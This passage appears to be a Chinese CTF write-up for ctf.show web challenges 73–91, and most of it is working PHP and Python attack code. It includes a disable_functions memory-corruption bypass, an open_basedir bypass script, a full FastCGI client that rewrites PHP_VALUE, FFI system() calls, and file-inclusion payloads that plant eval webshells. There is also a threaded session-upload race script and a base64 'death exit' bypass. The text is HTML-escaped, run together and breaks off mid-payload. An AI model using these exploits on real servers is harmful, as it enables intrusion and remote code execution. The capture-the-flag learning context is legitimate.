&quot;\\n&quot;; # build fake closure_object write(0x90, leakA(0x10)); write(0x90 + 0x08, leakA(0x18)); write(0x90 + 0x10, leakA(0x20)); write(0x90 + 0x18, leakA(0x28)); $abc[0x90 + 0x38] = &quot;\\x01&quot;; write(0x90 + 0x68, substr($php_heap, 0, 4) . hex2bin($system_address)); # let b get this object write(0x20, substr($php_heap, 0, 4) . hex2bin(dechex(str2int($php_heap) + 0x08 - 0xa0))); # eval system ($helper -&gt; b)($cmd); exit();&#125; 上面两种方法都不行，nginx直接502，不知道为啥，直接包含也行,竟然没open_basedir 1c&#x3D;include(&#39;&#x2F;flagc.txt&#39;);die(); web74glob://协议读文件名，包含得到flag web75glob://协议读文件名flag36.txt，p牛的bypass open_basedir脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105&lt;?phpheader(&#x27;content-type: text/plain&#x27;);error_reporting(-1);ini_set(&#x27;display_errors&#x27;, TRUE);printf(&quot;open_basedir: %s\\nphp_version: %s\\n&quot;, ini_get(&#x27;open_basedir&#x27;), phpversion());printf(&quot;disable_functions: %s\\n&quot;, ini_get(&#x27;disable_functions&#x27;));$file = str_replace(&#x27;\\\\&#x27;, &#x27;/&#x27;, isset($_REQUEST[&#x27;file&#x27;]) ? $_REQUEST[&#x27;file&#x27;] : &#x27;/etc/passwd&#x27;);$relat_file = getRelativePath(__FILE__, $file);$paths = explode(&#x27;/&#x27;, $file);$name = mt_rand() % 999;$exp = getRandStr();mkdir($name);chdir($name);for($i = 1 ; $i &lt; count($paths) - 1 ; $i++)&#123; mkdir($paths[$i]); chdir($paths[$i]);&#125;mkdir($paths[$i]);for ($i -= 1; $i &gt; 0; $i--) &#123; chdir(&#x27;..&#x27;);&#125;$paths = explode(&#x27;/&#x27;, $relat_file);$j = 0;for ($i = 0; $paths[$i] == &#x27;..&#x27;; $i++) &#123; mkdir($name); chdir($name); $j++;&#125;for ($i = 0; $i &lt;= $j; $i++) &#123; chdir(&#x27;..&#x27;);&#125;$tmp = array_fill(0, $j + 1, $name);symlink(implode(&#x27;/&#x27;, $tmp), &#x27;tmplink&#x27;);$tmp = array_fill(0, $j, &#x27;..&#x27;);symlink(&#x27;tmplink/&#x27; . implode(&#x27;/&#x27;, $tmp) . $file, $exp);unlink(&#x27;tmplink&#x27;);mkdir(&#x27;tmplink&#x27;);delfile($name);$exp = dirname($_SERVER[&#x27;SCRIPT_NAME&#x27;]) . &quot;/&#123;$exp&#125;&quot;;$exp = &quot;http://&#123;$_SERVER[&#x27;SERVER_NAME&#x27;]&#125;&#123;$exp&#125;&quot;;echo &quot;\\n-----------------content---------------\\n\\n&quot;;echo file_get_contents($exp);delfile(&#x27;tmplink&#x27;);function getRelativePath($from, $to) &#123; // some compatibility fixes for Windows paths $from = rtrim($from, &#x27;\\/&#x27;) . &#x27;/&#x27;; $from = str_replace(&#x27;\\\\&#x27;, &#x27;/&#x27;, $from); $to = str_replace(&#x27;\\\\&#x27;, &#x27;/&#x27;, $to); $from = explode(&#x27;/&#x27;, $from); $to = explode(&#x27;/&#x27;, $to); $relPath = $to; foreach($from as $depth =&gt; $dir) &#123; // find first non-matching dir if($dir === $to[$depth]) &#123; // ignore this directory array_shift($relPath); &#125; else &#123; // get number of remaining dirs to $from $remaining = count($from) - $depth; if($remaining &gt; 1) &#123; // add traversals up to first matching dir $padLength = (count($relPath) + $remaining - 1) * -1; $relPath = array_pad($relPath, $padLength, &#x27;..&#x27;); break; &#125; else &#123; $relPath[0] = &#x27;./&#x27; . $relPath[0]; &#125; &#125; &#125; return implode(&#x27;/&#x27;, $relPath);&#125;function delfile($deldir)&#123; if (@is_file($deldir)) &#123; @chmod($deldir,0777); return @unlink($deldir); &#125;else if(@is_dir($deldir))&#123; if(($mydir = @opendir($deldir)) == NULL) return false; while(false !== ($file = @readdir($mydir))) &#123; $name = File_Str($deldir.&#x27;/&#x27;.$file); if(($file!=&#x27;.&#x27;) &amp;&amp; ($file!=&#x27;..&#x27;))&#123;delfile($name);&#125; &#125; @closedir($mydir); @chmod($deldir,0777); return @rmdir($deldir) ? true : false; &#125;&#125;function File_Str($string)&#123; return str_replace(&#x27;//&#x27;,&#x27;/&#x27;,str_replace(&#x27;\\\\&#x27;,&#x27;/&#x27;,$string));&#125;function getRandStr($length = 6) &#123; $chars = &#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;; $randStr = &#x27;&#x27;; for ($i = 0; $i &lt; $length; $i++) &#123; $randStr .= substr($chars, mt_rand(0, strlen($chars) - 1), 1); &#125; return $randStr;&#125; 不大行 php获取敏感信息的脚本： 1234567891011121314151617&lt;?phpprintf(&quot;System: %s\\n&quot;,php_uname());printf(&quot;php_version: %s\\n&quot;,phpversion());printf(&quot;open_basedir: %s\\n\\n&quot;, ini_get(&#x27;open_basedir&#x27;));printf(&quot;disable_functions: %s\\n\\n&quot;, ini_get(&#x27;disable_functions&#x27;));printf(&quot;all_extensions: &quot;);foreach(get_loaded_extensions() as $key =&gt; $value)&#123; printf(&quot;%s &quot;,$value);&#125;printf(&quot;\\n\\nENVIRONMENT: &quot;);foreach(getenv() as $key =&gt; $value)&#123; printf(&quot;\\n\\n%s=%s&quot;,$key,$value);&#125;foreach(ini_get_all() as $key =&gt; $value)&#123; printf(&quot;\\n\\n%s ==&gt; %s&quot;,$key,$value[&quot;local_value&quot;]);&#125;exit(); 攻击fastcgi exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330&lt;?phpclass TimedOutException extends Exception &#123;&#125;class ForbiddenException extends Exception &#123;&#125;class Client &#123;const VERSION_1 = 1;const BEGIN_REQUEST = 1;const ABORT_REQUEST = 2;const END_REQUEST = 3;const PARAMS = 4;const STDIN = 5;const STDOUT = 6;const STDERR = 7;const DATA = 8;const GET_VALUES = 9;const GET_VALUES_RESULT = 10;const UNKNOWN_TYPE = 11;const MAXTYPE = self::UNKNOWN_TYPE;const RESPONDER = 1;const AUTHORIZER = 2;const FILTER = 3;const REQUEST_COMPLETE = 0;const CANT_MPX_CONN = 1;const OVERLOADED = 2;const UNKNOWN_ROLE = 3;const MAX_CONNS = &#x27;MAX_CONNS&#x27;;const MAX_REQS = &#x27;MAX_REQS&#x27;;const MPXS_CONNS = &#x27;MPXS_CONNS&#x27;;const HEADER_LEN = 8;const REQ_STATE_WRITTEN = 1;const REQ_STATE_OK = 2;const REQ_STATE_ERR = 3;const REQ_STATE_TIMED_OUT = 4;private $_sock = null;private $_host = null;private $_port = null;private $_keepAlive = false;private $_requests = array();private $_persistentSocket = false;private $_connectTimeout = 5000;private $_readWriteTimeout = 5000;public function __construct( $host, $port ) &#123; $this-&gt;_host = $host; $this-&gt;_port = $port;&#125;public function setKeepAlive( $b ) &#123; $this-&gt;_keepAlive = (boolean) $b; if ( ! $this-&gt;_keepAlive &amp;&amp; $this-&gt;_sock ) &#123; fclose( $this-&gt;_sock ); &#125;&#125;public function getKeepAlive() &#123; return $this-&gt;_keepAlive;&#125;public function setPersistentSocket( $b ) &#123; $was_persistent = ( $this-&gt;_sock &amp;&amp; $this-&gt;_persistentSocket ); $this-&gt;_persistentSocket = (boolean) $b; if ( ! $this-&gt;_persistentSocket &amp;&amp; $was_persistent ) &#123; fclose( $this-&gt;_sock ); &#125;&#125;public function getPersistentSocket() &#123; return $this-&gt;_persistentSocket;&#125;public function setConnectTimeout( $timeoutMs ) &#123; $this-&gt;_connectTimeout = $timeoutMs;&#125;public function getConnectTimeout() &#123; return $this-&gt;_connectTimeout;&#125;public function setReadWriteTimeout( $timeoutMs ) &#123; $this-&gt;_readWriteTimeout = $timeoutMs; $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout );&#125;public function getReadWriteTimeout() &#123; return $this-&gt;_readWriteTimeout;&#125;private function set_ms_timeout( $timeoutMs ) &#123; if ( ! $this-&gt;_sock ) &#123; return false; &#125; return stream_set_timeout( $this-&gt;_sock, floor( $timeoutMs / 1000 ), ( $timeoutMs % 1000 ) * 1000 );&#125;private function connect() &#123; if ( ! $this-&gt;_sock ) &#123; if ( $this-&gt;_persistentSocket ) &#123; $this-&gt;_sock = pfsockopen( $this-&gt;_host, $this-&gt;_port, $errno, $errstr, $this-&gt;_connectTimeout / 1000 ); &#125; else &#123; $this-&gt;_sock = fsockopen( $this-&gt;_host, $this-&gt;_port, $errno, $errstr, $this-&gt;_connectTimeout / 1000 ); &#125; if ( ! $this-&gt;_sock ) &#123; throw new Exception( &#x27;Unable to connect to FastCGI application: &#x27; . $errstr ); &#125; if ( ! $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout ) ) &#123; throw new Exception( &#x27;Unable to set timeout on socket&#x27; ); &#125; &#125;&#125;private function buildPacket( $type, $content, $requestId = 1 ) &#123; $clen = strlen( $content ); return chr( self::VERSION_1 ) /* version */ . chr( $type ) /* type */ . chr( ( $requestId &gt;&gt; 8 ) &amp; 0xFF ) /* requestIdB1 */ . chr( $requestId &amp; 0xFF ) /* requestIdB0 */ . chr( ( $clen &gt;&gt; 8 ) &amp; 0xFF ) /* contentLengthB1 */ . chr( $clen &amp; 0xFF ) /* contentLengthB0 */ . chr( 0 ) /* paddingLength */ . chr( 0 ) /* reserved */ . $content; /* content */&#125;private function buildNvpair( $name, $value ) &#123; $nlen = strlen( $name ); $vlen = strlen( $value ); if ( $nlen &lt; 128 ) &#123; /* nameLengthB0 */ $nvpair = chr( $nlen ); &#125; else &#123; /* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */ $nvpair = chr( ( $nlen &gt;&gt; 24 ) | 0x80 ) . chr( ( $nlen &gt;&gt; 16 ) &amp; 0xFF ) . chr( ( $nlen &gt;&gt; 8 ) &amp; 0xFF ) . chr( $nlen &amp; 0xFF ); &#125; if ( $vlen &lt; 128 ) &#123; /* valueLengthB0 */ $nvpair .= chr( $vlen ); &#125; else &#123; /* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */ $nvpair .= chr( ( $vlen &gt;&gt; 24 ) | 0x80 ) . chr( ( $vlen &gt;&gt; 16 ) &amp; 0xFF ) . chr( ( $vlen &gt;&gt; 8 ) &amp; 0xFF ) . chr( $vlen &amp; 0xFF ); &#125; /* nameData &amp; valueData */ return $nvpair . $name . $value;&#125;private function readNvpair( $data, $length = null ) &#123; $array = array(); if ( $length === null ) &#123; $length = strlen( $data ); &#125; $p = 0; while ( $p != $length ) &#123; $nlen = ord( $data&#123;$p ++&#125; ); if ( $nlen &gt;= 128 ) &#123; $nlen = ( $nlen &amp; 0x7F &lt;&lt; 24 ); $nlen |= ( ord( $data&#123;$p ++&#125; ) &lt;&lt; 16 ); $nlen |= ( ord( $data&#123;$p ++&#125; ) &lt;&lt; 8 ); $nlen |= ( ord( $data&#123;$p ++&#125; ) ); &#125; $vlen = ord( $data&#123;$p ++&#125; ); if ( $vlen &gt;= 128 ) &#123; $vlen = ( $nlen &amp; 0x7F &lt;&lt; 24 ); $vlen |= ( ord( $data&#123;$p ++&#125; ) &lt;&lt; 16 ); $vlen |= ( ord( $data&#123;$p ++&#125; ) &lt;&lt; 8 ); $vlen |= ( ord( $data&#123;$p ++&#125; ) ); &#125; $array[ substr( $data, $p, $nlen ) ] = substr( $data, $p + $nlen, $vlen ); $p += ( $nlen + $vlen ); &#125; return $array;&#125;private function decodePacketHeader( $data ) &#123; $ret = array(); $ret[&#x27;version&#x27;] = ord( $data&#123;0&#125; ); $ret[&#x27;type&#x27;] = ord( $data&#123;1&#125; ); $ret[&#x27;requestId&#x27;] = ( ord( $data&#123;2&#125; ) &lt;&lt; 8 ) + ord( $data&#123;3&#125; ); $ret[&#x27;contentLength&#x27;] = ( ord( $data&#123;4&#125; ) &lt;&lt; 8 ) + ord( $data&#123;5&#125; ); $ret[&#x27;paddingLength&#x27;] = ord( $data&#123;6&#125; ); $ret[&#x27;reserved&#x27;] = ord( $data&#123;7&#125; ); return $ret;&#125;private function readPacket() &#123; if ( $packet = fread( $this-&gt;_sock, self::HEADER_LEN ) ) &#123; $resp = $this-&gt;decodePacketHeader( $packet ); $resp[&#x27;content&#x27;] = &#x27;&#x27;; if ( $resp[&#x27;contentLength&#x27;] ) &#123; $len = $resp[&#x27;contentLength&#x27;]; while ( $len &amp;&amp; ( $buf = fread( $this-&gt;_sock, $len ) ) !== false ) &#123; $len -= strlen( $buf ); $resp[&#x27;content&#x27;] .= $buf; &#125; &#125; if ( $resp[&#x27;paddingLength&#x27;] ) &#123; $buf = fread( $this-&gt;_sock, $resp[&#x27;paddingLength&#x27;] ); &#125; return $resp; &#125; else &#123; return false; &#125;&#125;public function getValues( array $requestedInfo ) &#123; $this-&gt;connect(); $request = &#x27;&#x27;; foreach ( $requestedInfo as $info ) &#123; $request .= $this-&gt;buildNvpair( $info, &#x27;&#x27; ); &#125; fwrite( $this-&gt;_sock, $this-&gt;buildPacket( self::GET_VALUES, $request, 0 ) ); $resp = $this-&gt;readPacket(); if ( $resp[&#x27;type&#x27;] == self::GET_VALUES_RESULT ) &#123; return $this-&gt;readNvpair( $resp[&#x27;content&#x27;], $resp[&#x27;length&#x27;] ); &#125; else &#123; throw new Exception( &#x27;Unexpected response type, expecting GET_VALUES_RESULT&#x27; ); &#125;&#125;public function request( array $params, $stdin ) &#123; $id = $this-&gt;async_request( $params, $stdin ); return $this-&gt;wait_for_response( $id );&#125;public function async_request( array $params, $stdin ) &#123; $this-&gt;connect(); // Pick random number between 1 and max 16 bit unsigned int 65535 $id = mt_rand( 1, ( 1 &lt;&lt; 16 ) - 1 ); // Using persistent sockets implies you want them keept alive by server! $keepAlive = intval( $this-&gt;_keepAlive || $this-&gt;_persistentSocket ); $request = $this-&gt;buildPacket( self::BEGIN_REQUEST , chr( 0 ) . chr( self::RESPONDER ) . chr( $keepAlive ) . str_repeat( chr( 0 ), 5 ) , $id ); $paramsRequest = &#x27;&#x27;; foreach ( $params as $key =&gt; $value ) &#123; $paramsRequest .= $this-&gt;buildNvpair( $key, $value, $id ); &#125; if ( $paramsRequest ) &#123; $request .= $this-&gt;buildPacket( self::PARAMS, $paramsRequest, $id ); &#125; $request .= $this-&gt;buildPacket( self::PARAMS, &#x27;&#x27;, $id ); if ( $stdin ) &#123; $request .= $this-&gt;buildPacket( self::STDIN, $stdin, $id ); &#125; $request .= $this-&gt;buildPacket( self::STDIN, &#x27;&#x27;, $id ); if ( fwrite( $this-&gt;_sock, $request ) === false || fflush( $this-&gt;_sock ) === false ) &#123; $info = stream_get_meta_data( $this-&gt;_sock ); if ( $info[&#x27;timed_out&#x27;] ) &#123; throw new TimedOutException( &#x27;Write timed out&#x27; ); &#125; // Broken pipe, tear down so future requests might succeed fclose( $this-&gt;_sock ); throw new Exception( &#x27;Failed to write request to socket&#x27; ); &#125; $this-&gt;_requests[ $id ] = array( &#x27;state&#x27; =&gt; self::REQ_STATE_WRITTEN, &#x27;response&#x27; =&gt; null ); return $id;&#125;public function wait_for_response( $requestId, $timeoutMs = 0 ) &#123; if ( ! isset( $this-&gt;_requests[ $requestId ] ) ) &#123; throw new Exception( &#x27;Invalid request id given&#x27; ); &#125; if ( $this-&gt;_requests[ $requestId ][&#x27;state&#x27;] == self::REQ_STATE_OK || $this-&gt;_requests[ $requestId ][&#x27;state&#x27;] == self::REQ_STATE_ERR ) &#123; return $this-&gt;_requests[ $requestId ][&#x27;response&#x27;]; &#125; if ( $timeoutMs &gt; 0 ) &#123; // Reset timeout on socket for now $this-&gt;set_ms_timeout( $timeoutMs ); &#125; else &#123; $timeoutMs = $this-&gt;_readWriteTimeout; &#125; $startTime = microtime( true ); do &#123; $resp = $this-&gt;readPacket(); if ( $resp[&#x27;type&#x27;] == self::STDOUT || $resp[&#x27;type&#x27;] == self::STDERR ) &#123; if ( $resp[&#x27;type&#x27;] == self::STDERR ) &#123; $this-&gt;_requests[ $resp[&#x27;requestId&#x27;] ][&#x27;state&#x27;] = self::REQ_STATE_ERR; &#125; $this-&gt;_requests[ $resp[&#x27;requestId&#x27;] ][&#x27;response&#x27;] .= $resp[&#x27;content&#x27;]; &#125; if ( $resp[&#x27;type&#x27;] == self::END_REQUEST ) &#123; $this-&gt;_requests[ $resp[&#x27;requestId&#x27;] ][&#x27;state&#x27;] = self::REQ_STATE_OK; if ( $resp[&#x27;requestId&#x27;] == $requestId ) &#123; break; &#125; &#125; if ( microtime( true ) - $startTime &gt;= ( $timeoutMs * 1000 ) ) &#123; // Reset $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout ); throw new Exception( &#x27;Timed out&#x27; ); &#125; &#125; while ( $resp ); if ( ! is_array( $resp ) ) &#123; $info = stream_get_meta_data( $this-&gt;_sock ); // We must reset timeout but it must be AFTER we get info $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout ); if ( $info[&#x27;timed_out&#x27;] ) &#123; throw new TimedOutException( &#x27;Read timed out&#x27; ); &#125; if ( $info[&#x27;unread_bytes&#x27;] == 0 &amp;&amp; $info[&#x27;blocked&#x27;] &amp;&amp; $info[&#x27;eof&#x27;] ) &#123; throw new ForbiddenException( &#x27;Not in white list. Check listen.allowed_clients.&#x27; ); &#125; throw new Exception( &#x27;Read failed&#x27; ); &#125; // Reset timeout $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout ); switch ( ord( $resp[&#x27;content&#x27;]&#123;4&#125; ) ) &#123; case self::CANT_MPX_CONN: throw new Exception( &#x27;This app can&#x27;t multiplex [CANT_MPX_CONN]&#x27; ); break; case self::OVERLOADED: throw new Exception( &#x27;New request rejected; too busy [OVERLOADED]&#x27; ); break; case self::UNKNOWN_ROLE: throw new Exception( &#x27;Role value not known [UNKNOWN_ROLE]&#x27; ); break; case self::REQUEST_COMPLETE: return $this-&gt;_requests[ $requestId ][&#x27;response&#x27;]; &#125;&#125;&#125;$client = new Client(&quot;unix:///tmp/php-cgi-74.sock&quot;, -1); $php_value = &quot;open_basedir = /&quot;;$filepath = &#x27;/tmp/readflag.php&#x27;; $content = &#x27;hpdoger&#x27;;echo $client-&gt;request( array( &#x27;GATEWAY_INTERFACE&#x27; =&gt; &#x27;FastCGI/1.0&#x27;, &#x27;REQUEST_METHOD&#x27; =&gt; &#x27;POST&#x27;, &#x27;SCRIPT_FILENAME&#x27; =&gt; $filepath, &#x27;SERVER_SOFTWARE&#x27; =&gt; &#x27;php/fcgiclient&#x27;, &#x27;REMOTE_ADDR&#x27; =&gt; &#x27;127.0.0.1&#x27;, &#x27;REMOTE_PORT&#x27; =&gt; &#x27;9985&#x27;, &#x27;SERVER_ADDR&#x27; =&gt; &#x27;127.0.0.1&#x27;, &#x27;SERVER_PORT&#x27; =&gt; &#x27;80&#x27;, &#x27;SERVER_NAME&#x27; =&gt; &#x27;mag-tured&#x27;, &#x27;SERVER_PROTOCOL&#x27; =&gt; &#x27;HTTP/1.1&#x27;, &#x27;CONTENT_TYPE&#x27; =&gt; &#x27;application/x-www-form-urlencoded&#x27;, &#x27;CONTENT_LENGTH&#x27; =&gt; strlen( $content ), &#x27;PHP_VALUE&#x27; =&gt; $php_value,),$content); 可以用下面代码判断php以什么运行: 1&lt;?php echo php_sapi_name();exit(); 下面这段代码可以建立sock连接 123456789101112131415&lt;?php$fp = fsockopen(&quot;www.example.com&quot;, 80, $errno, $errstr, 30);if (!$fp) &#123; echo &quot;$errstr ($errno)&lt;br /&gt;\\n&quot;;&#125; else &#123; $out = &quot;GET / HTTP/1.1\\r\\n&quot;; $out .= &quot;Host: www.example.com\\r\\n&quot;; $out .= &quot;Connection: Close\\r\\n\\r\\n&quot;; fwrite($fp, $out); while (!feof($fp)) &#123; echo fread($fp, 128); &#125; fclose($fp);&#125;?&gt; 上面的都不行 后来才知道数据库读文件 np 1c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;) as $row)&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-&gt;getMessage();exit(0);&#125;exit(0); web76和上题一样 web77提示说php7.4 立马想到FFI 123c=?&gt;&lt;?php $ffi = FFI::cdef(&quot;int system(const char *command);&quot;);$ffi-&gt;system(&quot;/readflag &gt;/var/www/html/1&quot;);exit(); 访问文件1即可得到flag web7812345678&lt;?phpif(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); include($file);&#125;else&#123; highlight_file(__FILE__);&#125; payload: 1?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php web7912345678&lt;?phpif(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); include($file);&#125;else&#123; highlight_file(__FILE__);&#125; payload: 1?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCdjYXQgKicpOw&#x3D;&#x3D; web80123456789&lt;?phpif(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file); include($file);&#125;else&#123; highlight_file(__FILE__);&#125; payload: 123?file&#x3D;Php:&#x2F;&#x2F;inputPOST:&lt;?php system(&#39;cat *&#39;); web8112345678910&lt;?phpif(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file); include($file);&#125;else&#123; highlight_file(__FILE__);&#125; session上传进度getshell exp: 123456789101112131415161718192021222324252627282930import requestsimport threadingurl=&#x27;http://14889bba-5316-4070-95aa-6d25fca72b8f.chall.ctf.show/&#x27;r=requests.session()headers=&#123; &quot;Cookie&quot;:&#x27;PHPSESSID=dddd&#x27;&#125;def POST(): while True: files=&#123; &quot;upload&quot;:&#x27;&#x27; #上传无效的空文件 &#125; data=&#123; &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;:&#x27;&lt;?php file_put_contents(&quot;/tmp/2&quot;,\\&#x27;&lt;?php @eval($_POST[1]);?&gt;\\&#x27;);echo &quot;moonback&quot;;?&gt;&#x27; &#125; r.post(url,files=files,headers=headers,data=data) # print(&#x27;[+]POST&#x27;)def READ(): while True: t=r.get(url+&quot;?file=/tmp/sess_dddd&quot;) if &#x27;moonback&#x27; in t.text: # print(&#x27;[+]retry&#x27;) print(&#x27;success&#x27;) else: passfor i in range(50): threading.Thread(target=POST,args=()).start() threading.Thread(target=READ,args=()).start() web821234567891011&lt;?phpif(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file); include($file);&#125;else&#123; highlight_file(__FILE__);&#125; session上传进度getshell web83123456789101112131415&lt;?phpsession_unset();session_destroy();if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file); include($file);&#125;else&#123; highlight_file(__FILE__);&#125; session上传进度getshell web84123456789101112&lt;?phpif(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file); system(&quot;rm -rf /tmp/*&quot;); include($file);&#125;else&#123; highlight_file(__FILE__);&#125; 由于把/tmp下的文件都清空了，因此不能在往里面写文件了，往网站目录写 web85123456789101112131415161718&lt;?phpif(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file); if(file_exists($file))&#123; $content = file_get_contents($file); if(strpos($content, &quot;&lt;&quot;)&gt;0)&#123; die(&quot;error&quot;); &#125; include($file); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; session上传进度getshell web86123456789101112131415&lt;?phpdefine(&#x27;还要秀？&#x27;, dirname(__FILE__));set_include_path(还要秀？);if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file); include($file); &#125;else&#123; highlight_file(__FILE__);&#125; session上传进度getshell web871234567891011121314&lt;?phpif(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $content = $_POST[&#x27;content&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file); file_put_contents(urldecode($file), &quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;.$content); &#125;else&#123; highlight_file(__FILE__);&#125; url二次编码绕过前面的限制 接着bypass 死亡退出就行 1php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;a.php 先看下需要补充多少有效字符 1&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt; 里面能被base64解码的字符只有phpdie六个，base64 四个一组，补两个 123?file&#x3D;%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%36%31%25%32%65%25%37%30%25%36%38%25%37%30POST: content&#x3D;aaPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+ web8812345678910&lt;?phpif(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; if(preg_match(&quot;/php|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\-|\\_|\\+|\\=|\\./i&quot;, $file))&#123; die(&quot;error&quot;); &#125; include($file);&#125;else&#123; highlight_file(__FILE__);&#125; 直接包含data://协议就行，等于号用于补尾 直接删掉就行 1?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOw web8912345678910111213&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if(preg_match(&quot;/[0-9]/&quot;, $num))&#123; die(&quot;no no no!&quot;); &#125; if(intval($num))&#123; echo $flag; &#125;&#125; 数组绕过： 123&lt;?phpvar_dump(intval([])); // 0var_dump(intval([1])); // 1 默认传参会有值 12345 &lt;?phphighlight_file(__FILE__);var_dump($_GET[&#x27;num&#x27;]); // array(1) &#123; [0]=&gt; string(0) &quot;&quot; &#125; // ?num[]= web901234567891011121314&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num===&quot;4476&quot;)&#123; die(&quot;no no no!&quot;); &#125; if(intval($num,0)===4476)&#123; echo $flag; &#125;else&#123; echo intval($num,0); &#125;&#125; payload: 1?num&#x3D;4476a web91123456789101112131415&lt;?phpshow_source(__FILE__);include(&#x27;flag.php&#x27;);$a=$_GET[&#x27;cmd&#x27;];if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123; if(preg_match(&#x27;/^php$/i&#x27;, $a))&#123; echo &#x27;hacker&#x27;; &#125; else&#123; echo $flag; &#125;&#125;else&#123; echo &#x27;nonononono&#x27;;&#125; payload: 